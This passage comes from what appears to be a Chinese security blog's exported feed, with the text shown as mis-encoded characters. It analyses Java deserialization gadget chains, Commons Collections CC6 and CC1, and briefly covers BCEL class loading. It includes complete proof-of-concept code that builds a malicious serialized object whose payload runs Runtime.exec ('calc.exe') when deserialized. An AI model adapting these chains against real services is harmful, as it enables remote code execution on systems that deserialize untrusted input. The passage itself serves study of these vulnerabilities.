å¼€å¤´åˆ™é€šè¿‡ä¸€ä¸ª repository åŠ è½½ç±»</li><li>å¦‚æœä¸Šé¢ä¸¤æ­¥æˆåŠŸè·å–åˆ°äº† Class å¯¹è±¡ï¼ˆæ— è®ºæ˜¯åˆ›å»ºçš„è¿˜æ˜¯ä» repository åŠ è½½çš„ï¼‰ï¼Œå°±ä¼šè°ƒç”¨Â <code>defineClass()</code></li><li>ä¸Šè¿°æ­¥éª¤éƒ½å¤±è´¥åˆ™ä½¿ç”¨é»˜è®¤ç±»åŠ è½½å™¨Â <code>Class.forName()</code></li></ol><p>ä¸ºäº†åˆ›å»ºç”¨äºè¢«åŠ è½½çš„ BCEL å­—èŠ‚ç ï¼Œå¯ä»¥ç”¨ BCEL æä¾›çš„ä¸¤ä¸ªç±»Â <code>Repository</code>Â <code>Utility</code></p><ul><li><code>Repository.lookup()</code>Â å¯ä»¥åŠ è½½ä¸€ä¸ªç±»ï¼Œè§£æä¸º JavaClass å¯¹è±¡</li><li><code>Utility.encode()</code>Â å°† JavaClass å¯¹è±¡è½¬æ¢æˆ BCEL å­—èŠ‚ç </li></ul><p>ç®€å•çš„demoï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BCELExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(CustomClass.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”CommonsCollections6</title>
      <link href="/2025/03/27/java-cc6/"/>
      <url>/2025/03/27/java-cc6/</url>
      
        <content type="html"><![CDATA[<p>åœ¨javaçš„8u71ç‰ˆæœ¬åï¼Œ<code>AnnotationInvocationHandler</code><br>ç±»çš„<code>readObject</code>æ–¹æ³•é€»è¾‘å˜åŒ–äº†<br>è¿™å°±å¯¼è‡´äº†æˆ‘ä»¬çš„CC1é“¾å­å¤±æ•ˆ<br>æ‰€ä»¥è¿™é‡Œæœ‰å¦ä¸€ç§é“¾å­è¾ƒä¸ºé€šç”¨<br>ï¼š<code>ysoserial</code>çš„<code>CommonsCollections6</code>:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Step 1: æ„é€ Transformeré“¾ï¼ˆæœ€ç»ˆè§¦å‘Runtime.execï¼‰</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// å¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 2: åˆ›å»ºLazyMapå¹¶å…³è”Transformeré“¾</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 3: å°†LazyMapå°è£…åˆ°TiedMapEntryä¸­</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 4: å°†TiedMapEntryæ”¾å…¥HashMapä»¥è§¦å‘ååºåˆ—åŒ–é“¾</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 5: ç§»é™¤LazyMapä¸­çš„ç¼“å­˜ï¼Œç¡®ä¿ååºåˆ—åŒ–æ—¶è§¦å‘é“¾</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 6: ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 7: æ¨¡æ‹Ÿååºåˆ—åŒ–æ”»å‡»ï¼ˆè§¦å‘æ¼æ´ï¼‰</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();  <span class="comment">// æ­¤å¤„å¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h2><ul><li><strong>ç¿»è¯‘å™¨é“¾å­</strong></li></ul><p>è¿™ä¸ªè¿˜æ˜¯å’ŒCC1æœ€åä¸€æ ·ï¼Œ<br>åå°„è°ƒç”¨åˆ°<code>Runtime</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// å¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰</span></span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ‰§è¡Œçš„æ“ä½œ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¦‚æœæ‰§è¡Œ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">chain.transform(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure><p>åˆ™å¼¹å‡ºè®¡ç®—å™¨</p><ul><li><strong>LazyMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 2: åˆ›å»ºLazyMapå¹¶å…³è”Transformeré“¾</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br></pre></td></tr></table></figure>è¿™ä¸ªç±»çš„ä½œç”¨æ˜¯å®ç°ä¸€ä¸ªæ‡’åŠ è½½<br>æ€ä¹ˆå®ç°çš„å‘¢ï¼Ÿ<br>çœ‹çœ‹å®ƒçš„æ„é€ æ–¹æ³•ä»¥åŠ<code>get()</code>æ–¹æ³•ï¼š<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">                map.put(key, value);</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å¯è§ç”Ÿæˆå¯¹è±¡çš„æ—¶å€™å¯ä»¥ä¼ å…¥ä¸€ä¸ªç¿»è¯‘å™¨ä½œä¸ºå€¼åŠ å·¥å‚<br>å½“ä»<code>LazyMap</code>é‡Œgetå€¼çš„æ—¶å€™</li></ul><p>å¦‚æœæ²¡æœ‰getåˆ°ï¼Œå°±ä¼šæ ¹æ®é”®ååŠ å·¥å‡ºä¸€ä¸ªå€¼ï¼ˆ<code>value</code>ï¼‰æ¥<br>è¿”å›å¹¶åŠ åˆ°mapä¸­<br>è¿™å°±å®ç°äº†ç¿»è¯‘æ“ä½œçš„è§¦å‘</p><p>è¿™æ—¶å€™è§¦å‘å¼¹å‡ºè®¡ç®—å™¨çš„æ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.get(<span class="string">&quot;ciallo&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>TiedMapEntry</strong></li></ul><p>å…¶è®¾è®¡åˆè¡·æ˜¯ç®€åŒ–é”®å€¼å¯¹çš„ç»‘å®šæ“ä½œï¼Œå¹¶æä¾›å»¶è¿ŸåŠ è½½æˆ–åŠ¨æ€è®¡ç®—çš„ç‰¹æ€§ã€‚<br>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå®ƒçš„åº”ç”¨åœºæ™¯ç›¸å¯¹æœ‰é™ï¼Œä½†åœ¨ç‰¹å®šéœ€æ±‚ä¸‹å¯ä»¥å‘æŒ¥ç‹¬ç‰¹ä½œç”¨ã€‚<br>å½“éœ€è¦æŒ‰éœ€ç”Ÿæˆæˆ–åŠ è½½æŸäº›èµ„æºï¼ˆå¦‚ç¼“å­˜æ•°æ®ã€åŠ¨æ€é…ç½®ï¼‰æ—¶ï¼Œ<br>ç»“åˆ<code>LazyMap</code>ä½¿ç”¨<code>TiedMapEntry</code>ï¼Œ<br>å¯ä»¥é¿å…ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰æ•°æ®ï¼Œå‡å°‘èµ„æºæ¶ˆè€—</p><p>ä½¿ç”¨ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ª Transformerï¼ŒæŒ‰éœ€ç”Ÿæˆ Value</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">lazyTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œï¼ˆå¦‚æ•°æ®åº“æŸ¥è¯¢ï¼‰</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Generating value for key: &quot;</span> + key);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Value_&quot;</span> + key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»º LazyMapï¼Œç»‘å®šè‡ªå®šä¹‰ Transformer</span></span><br><span class="line">Map&lt;String, Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), lazyTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»‘å®šé”®ä¸ LazyMap</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;user_123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é¦–æ¬¡è°ƒç”¨ getValue() è§¦å‘å»¶è¿ŸåŠ è½½</span></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// è¾“å‡º: Generating value for key: user_123 â†’ Value_user_123</span></span><br><span class="line"></span><br><span class="line">System.out.println(tiedEntry.getValue()); </span><br><span class="line"><span class="comment">// ç›´æ¥è¿”å›ç¼“å­˜å€¼ â†’ Value_user_123</span></span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬ä¸<code>LazyMap</code>ç»‘å®šä½¿ç”¨<br>ä»–çš„<code>hashcode</code>æ–¹æ³•ä¸­è°ƒç”¨äº†è§¦å‘<code>LazyMap</code>çš„<code>get</code><br>ä»–çš„æ„é€ æ–¹æ³•ã€<code>hashcode</code>ä»¥åŠ<code>getvalue</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">                (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬æ‰¾ä¸€æ‰¾æ€ä¹ˆè°ƒç”¨ä»–çš„<code>hashcode</code><br>è¿™ä¸ªä¸œè¥¿éå¸¸çœ¼ç†Ÿ<br>æˆ‘ä»¬åœ¨<code>URLDNS</code>é“¾å­é‡Œä¸€èµ·çœ‹è¿‡<br>ç°åœ¨ç›®æ ‡å°±ä»è°ƒç”¨<code>URL</code>ç±»çš„<code>hashcode</code><br>è½¬æ¢ä¸ºäº†<code>TiedMapEntry</code>çš„<code>hashcode</code><br>å¼¹å‡ºè®¡ç®—å™¨çš„æ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">entry.hashCode();</span><br></pre></td></tr></table></figure><ul><li><strong>HashMap</strong><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 5: ç§»é™¤LazyMapä¸­çš„ç¼“å­˜ï¼Œç¡®ä¿ååºåˆ—åŒ–æ—¶è§¦å‘é“¾</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>ä¹‹ååºåˆ—åŒ–å³å¯:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Step 6: ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(hashMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 7: æ¨¡æ‹Ÿååºåˆ—åŒ–æ”»å‡»ï¼ˆè§¦å‘æ¼æ´ï¼‰</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">ois.readObject();  <span class="comment">// æ­¤å¤„å¼¹å‡ºè®¡ç®—å™¨</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”CommonsCollections1</title>
      <link href="/2025/03/26/java-cc1/"/>
      <url>/2025/03/26/java-cc1/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸€ä¸ªè§¦å‘å‘½ä»¤æ‰§è¡Œçš„Demo"><a href="#ä¸€ä¸ªè§¦å‘å‘½ä»¤æ‰§è¡Œçš„Demo" class="headerlink" title="ä¸€ä¸ªè§¦å‘å‘½ä»¤æ‰§è¡Œçš„Demo"></a>ä¸€ä¸ªè§¦å‘å‘½ä»¤æ‰§è¡Œçš„Demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="åˆ©ç”¨CCé“¾ä¸­çš„ç¿»è¯‘å™¨ç±»-Transformer-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#åˆ©ç”¨CCé“¾ä¸­çš„ç¿»è¯‘å™¨ç±»-Transformer-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨CCé“¾ä¸­çš„ç¿»è¯‘å™¨ç±»(Transformer)è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>åˆ©ç”¨CCé“¾ä¸­çš„ç¿»è¯‘å™¨ç±»(Transformer)è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>å‰é¢éƒ¨åˆ†å®šä¹‰äº†ä¸€ä¸ª<code>Transformer</code>çš„æ•°ç»„<br>å…¶ä¸­åŒ…å«ä¸¤ä¸ª<code>Transformer</code>ï¼š</p><p><strong>1.</strong> <code>ConstantTransformer</code>ï¼šè¿”å›å¸¸é‡çš„ç¿»è¯‘å™¨ï¼Œ<br>æ­¤å¤„ä¼ å…¥äº†å¯æ‰§è¡Œå‘½ä»¤çš„<code>Runtime</code>å¯¹è±¡<br>ä¹Ÿå°±æ˜¯æ— è®ºå¾€ç¿»è¯‘å™¨é‡Œä¼ å…¥ä»€ä¹ˆï¼Œéƒ½åªä¼šè¿”å›<code>Runtime</code>å¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.</strong> <code>InvokerTransformer</code>ï¼š<br>ä¼ å…¥å¯¹è±¡ï¼Œå‡½æ•°åï¼Œå‚æ•°<br>è¿”å›æ‰§è¡Œç»“æœ<br>æ‰€ä»¥æ­¤å¤„å¦‚æœä¼ å…¥<code>Runtime</code>å¯¹è±¡ã€å‡½æ•°<code>exec</code>ã€å‚æ•°<code>å‘½ä»¤(æ¼”ç¤ºç”¨calc)</code><br>å°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span 